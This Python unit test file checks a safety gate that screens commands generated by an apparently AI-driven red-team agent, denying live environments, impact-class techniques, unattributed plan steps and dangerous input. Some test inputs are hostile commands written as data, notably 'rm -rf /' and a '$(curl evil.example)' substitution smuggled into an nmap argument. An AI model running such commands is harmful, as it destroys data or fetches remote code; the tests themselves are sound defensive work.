"""Unit tests for the pre-execution safety gate."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from oubliette_warden.agents.codegen.base import (
    AttackTechnique,
    Command,
    ExecutionEnv,
    Task,
)
from oubliette_warden.agents.codegen.safety_gate import (
    DEFAULT_PIPELINE,
    GateContext,
    GateDecision,
    Verdict,
    evaluate,
    _stage_llm_judge,
    _stage_rag_guard,
)
from oubliette_warden.agents.planner.planner import Edge, TaskGraph


def _cmd(
    *,
    adapter: str = "nmap",
    argv: list[str] | None = None,
    impact: bool = False,
    runtime: int = 60,
    targets: list[str] | None = None,
    task_id: str = "",
) -> Command:
    return Command(
        adapter_name=adapter,
        argv=argv if argv is not None else ["nmap", "-sV", "10.0.0.1"],
        target_scope=targets if targets is not None else ["10.0.0.1"],
        attck_tactics=[AttackTechnique.IMPACT] if impact else [AttackTechnique.RECONNAISSANCE],
        attck_technique_ids=["T1499"] if impact else ["T1595"],
        is_active_probe=True,
        expected_runtime_seconds=runtime,
        rationale="test",
        task_id=task_id,
    )


def _eval(cmd: Command, env: ExecutionEnv) -> GateDecision:
    """Evaluate against the legacy downstream pipeline explicitly.

    CRIT-1 made the *default* pipeline prepend a fail-closed plan_consistency
    stage. The tests below target the five downstream deterministic stages
    (pre_filter/pattern_detector/rag_guard/llm_judge/mcp_guard), so they pin the
    explicit DEFAULT_PIPELINE. The new attribution gate has its own dedicated
    tests (see the CRIT-1 section at the bottom of this file).
    """
    return evaluate(cmd, env, pipeline=DEFAULT_PIPELINE)


def test_well_formed_command_still_escalates_pending_llm_judge():
    """CRIT-3: llm_judge is a fail-closed stub (no real integration yet), so
    even a structurally well-formed command must ESCALATE, never silently
    auto-APPROVE, until a real judge is wired in."""
    decision = _eval(_cmd(), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE
    # every deterministic stage before/after llm_judge still APPROVEs; only
    # llm_judge itself is responsible for the ESCALATE.
    by_stage = {s.stage: s.verdict for s in decision.stages}
    assert by_stage["pre_filter"] == Verdict.APPROVE
    assert by_stage["pattern_detector"] == Verdict.APPROVE
    assert by_stage["rag_guard"] == Verdict.APPROVE
    assert by_stage["llm_judge"] == Verdict.ESCALATE
    assert by_stage["mcp_guard"] == Verdict.APPROVE


def test_denies_non_caldera_env():
    decision = _eval(_cmd(), ExecutionEnv.LIVE)
    assert decision.final == Verdict.DENY
    assert any("CALDERA_ONLY" in s.reason for s in decision.stages)


def test_denies_impact_class():
    decision = _eval(_cmd(impact=True), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY
    assert any("Impact" in s.reason for s in decision.stages)


def test_denies_empty_argv():
    decision = _eval(_cmd(argv=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY


def test_denies_empty_target_scope():
    decision = _eval(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY


def test_denies_dangerous_substring():
    decision = _eval(
        _cmd(argv=["bash", "-c", "rm -rf /"]),
        ExecutionEnv.CALDERA_ONLY,
    )
    assert decision.final == Verdict.DENY
    assert any("forbidden token" in s.reason for s in decision.stages)


def test_denies_shell_substitution():
    decision = _eval(
        _cmd(argv=["nmap", "$(curl evil.example)"]),
        ExecutionEnv.CALDERA_ONLY,
    )
    assert decision.final == Verdict.DENY


def test_escalates_unknown_adapter():
    decision = _eval(_cmd(adapter="rogue_tool"), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE
    assert any(s.stage == "rag_guard" for s in decision.stages)


def test_escalates_long_runtime():
    decision = _eval(_cmd(runtime=3600), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE


def test_short_circuits_on_first_deny():
    decision = _eval(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY
    # pre_filter denies, so we should NOT have reached the later stages
    stages_run = {s.stage for s in decision.stages}
    assert stages_run == {"pre_filter"}


def test_decision_records_all_stages_when_approving():
    decision = _eval(_cmd(), ExecutionEnv.CALDERA_ONLY)
    stages_run = [s.stage for s in decision.stages]
    assert stages_run == ["pre_filter", "pattern_detector", "rag_guard", "llm_judge", "mcp_guard"]
    assert isinstance(decision, GateDecision)


# ---------- CRIT-3: stub gate stages must fail closed, never silently APPROVE ----------


def test_llm_judge_stub_returns_escalate_not_approve():
    """The llm_judge stage has no real integration yet (Phase I stub). It must
    never silently APPROVE; ESCALATE routes it to operator review instead."""
    result = _stage_llm_judge(_cmd(), ExecutionEnv.CALDERA_ONLY)
    assert result.verdict == Verdict.ESCALATE
    assert result.stage == "llm_judge"
    assert "not implemented" in result.reason or "fail" in result.reason.lower()


def test_llm_judge_stub_escalates_even_impact_free_command():
    """A command with no other red flags at all still can't bypass the stub."""
    decision = _eval(_cmd(impact=False, runtime=5), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE
    assert any(s.stage == "llm_judge" and s.verdict == Verdict.ESCALATE for s in decision.stages)


def test_rag_guard_unknown_adapter_is_fail_closed_escalate():
    """Regression guard: rag_guard's stub must ESCALATE (never APPROVE) an
    adapter that isn't on the Phase I known-good list."""
    result = _stage_rag_guard(_cmd(adapter="totally-unvetted-tool"), ExecutionEnv.CALDERA_ONLY)
    assert result.verdict == Verdict.ESCALATE


def test_rag_guard_known_adapters_still_approve():
    """Sanity: the fail-closed tightening must not regress the known-good list."""
    for name in ("nmap", "msf-aux"):
        result = _stage_rag_guard(_cmd(adapter=name), ExecutionEnv.CALDERA_ONLY)
        assert result.verdict == Verdict.APPROVE


# ---------- CRIT-1: plan_consistency is wired into the runtime default path ----------
#
# The default pipeline (pipeline=None) now runs plan_consistency FIRST and fails
# closed when the command cannot be attributed to a real, correctly-ordered
# planned task. These tests exercise that wiring through evaluate()'s default
# path (no explicit pipeline), which is exactly the path CommandAdapter._gate_or_raise
# uses in production.

SCOPE = ["10.0.0.1"]


def _single_task_plan(*, approved: bool = False) -> TaskGraph:
    """A one-node plan whose task matches the default _cmd() (nmap/recon/T1595)."""
    node = Task(
        task_id="task-a",
        intent="recon",
        target_scope=SCOPE,
        attck_technique_ids=["T1595"],
        operator_approved=approved,
        metadata={},  # no phase -> adapter/phase check is skipped
    )
    return TaskGraph(intent="t", target_scope=SCOPE, nodes=[node], edges=[])


def _two_task_plan(*, approved: bool = False) -> TaskGraph:
    """recon (task-a) must complete before follow-on (task-b)."""
    a = Task(
        task_id="task-a",
        intent="recon",
        target_scope=SCOPE,
        attck_technique_ids=["T1595"],
        operator_approved=approved,
        metadata={},
    )
    b = Task(
        task_id="task-b",
        intent="recon 2",
        target_scope=SCOPE,
        attck_technique_ids=["T1595"],
        operator_approved=approved,
        metadata={},
    )
    return TaskGraph(
        intent="t", target_scope=SCOPE, nodes=[a, b], edges=[Edge(before="task-a", after="task-b")]
    )


def test_valid_context_passes_plan_consistency_through_default_path():
    """Valid context (in-plan, predecessors complete) -> plan_consistency APPROVEs
    and the command flows through the default pipeline. The final verdict is
    ESCALATE only because of the llm_judge fail-closed stub (CRIT-3), never a
    plan_consistency DENY."""
    ctx = GateContext(plan=_single_task_plan(approved=True), completed_task_ids=set())
    decision = evaluate(_cmd(task_id="task-a"), ExecutionEnv.CALDERA_ONLY, context=ctx)

    by_stage = {s.stage: s.verdict for s in decision.stages}
    assert by_stage["plan_consistency"] == Verdict.APPROVE
    assert decision.stages[0].stage == "plan_consistency"  # runs FIRST
    assert decision.final != Verdict.DENY
    assert decision.final == Verdict.ESCALATE  # llm_judge stub, not plan_consistency


def test_missing_context_fails_closed_deny():
    """No plan context on the default path -> DENY, unattributable."""
    decision = evaluate(_cmd(task_id="task-a"), ExecutionEnv.CALDERA_ONLY, context=None)
    assert decision.final == Verdict.DENY
    assert decision.stages[0].stage == "plan_consistency"
    assert any("unattributable" in s.reason for s in decision.stages)


def test_empty_task_id_fails_closed_deny_even_with_context():
    """Context present but the command carries no task_id -> DENY, unattributable."""
    ctx = GateContext(plan=_single_task_plan(), completed_task_ids=set())
    decision = evaluate(_cmd(task_id=""), ExecutionEnv.CALDERA_ONLY, context=ctx)
    assert decision.final == Verdict.DENY
    assert any("unattributable" in s.reason for s in decision.stages)


def test_off_plan_task_id_denied():
    """A task_id not present in the plan is unattributable -> DENY."""
    ctx = GateContext(plan=_single_task_plan(), completed_task_ids=set())
    decision = evaluate(_cmd(task_id="ghost"), ExecutionEnv.CALDERA_ONLY, context=ctx)
    assert decision.final == Verdict.DENY
    assert decision.stages[0].stage == "plan_consistency"


def test_missing_predecessor_denied():
    """Skip-ahead: task-b's predecessor task-a is not completed -> DENY.
    Tasks are operator-approved so the DENY under test is ordering, not the
    anchored approval gate."""
    ctx = GateContext(plan=_two_task_plan(approved=True), completed_task_ids=set())
    decision = evaluate(_cmd(task_id="task-b"), ExecutionEnv.CALDERA_ONLY, context=ctx)
    assert decision.final == Verdict.DENY
    assert decision.stages[0].stage == "plan_consistency"


def test_predecessor_complete_passes_plan_consistency():
    """Same skip-ahead command, but with the predecessor marked complete, passes
    plan_consistency (final ESCALATE via the llm_judge stub, not a DENY)."""
    ctx = GateContext(plan=_two_task_plan(approved=True), completed_task_ids={"task-a"})
    decision = evaluate(_cmd(task_id="task-b"), ExecutionEnv.CALDERA_ONLY, context=ctx)
    by_stage = {s.stage: s.verdict for s in decision.stages}
    assert by_stage["plan_consistency"] == Verdict.APPROVE
    assert decision.final != Verdict.DENY


# ---------- Minor follow-up: warn on the explicit-pipeline + context bypass seam ----------
#
# Passing an explicit `pipeline` skips the auto-prepended plan_consistency
# attribution stage entirely (see `evaluate`'s default-path branch above). That's
# intentional for test isolation (explicit pipeline + context=None), but a caller
# who has real plan `context` and *also* passes an explicit pipeline silently
# loses fail-closed attribution. That combination should emit a warning.

_BYPASS_WARNING_SUBSTRING = "bypasses"


def test_explicit_pipeline_with_context_warns_of_bypass(caplog):
    """The dangerous case: explicit pipeline + real context -> plan_consistency
    never runs. This must emit a log.warning naming the bypass."""
    ctx = GateContext(plan=_single_task_plan(), completed_task_ids=set())
    with caplog.at_level("WARNING", logger="oubliette_warden.agents.codegen.safety_gate"):
        evaluate(_cmd(task_id="task-a"), ExecutionEnv.CALDERA_ONLY, pipeline=DEFAULT_PIPELINE, context=ctx)
    warnings = [r for r in caplog.records if r.levelname == "WARNING"]
    assert any(_BYPASS_WARNING_SUBSTRING in r.message.lower() for r in warnings), caplog.text
    assert any("plan_consistency" in r.message for r in warnings), caplog.text


def test_explicit_pipeline_without_context_does_not_warn(caplog):
    """Pure test-isolation path: explicit pipeline, context=None. This is the
    normal way existing unit tests call evaluate() -- must stay silent."""
    with caplog.at_level("WARNING", logger="oubliette_warden.agents.codegen.safety_gate"):
        evaluate(_cmd(task_id="task-a"), ExecutionEnv.CALDERA_ONLY, pipeline=DEFAULT_PIPELINE)
    assert not any(r.levelname == "WARNING" for r in caplog.records), caplog.text


def test_default_path_does_not_warn():
    """Normal production path (pipeline=None): attribution stage IS prepended,
    so there is nothing to warn about."""
    ctx = GateContext(plan=_single_task_plan(), completed_task_ids=set())
    import logging

    logger = logging.getLogger("oubliette_warden.agents.codegen.safety_gate")
    records = []

    class _Collector(logging.Handler):
        def emit(self, record):
            records.append(record)

    handler = _Collector()
    logger.addHandler(handler)
    try:
        evaluate(_cmd(task_id="task-a"), ExecutionEnv.CALDERA_ONLY, context=ctx)
    finally:
        logger.removeHandler(handler)
    assert not any(r.levelno >= logging.WARNING for r in records)
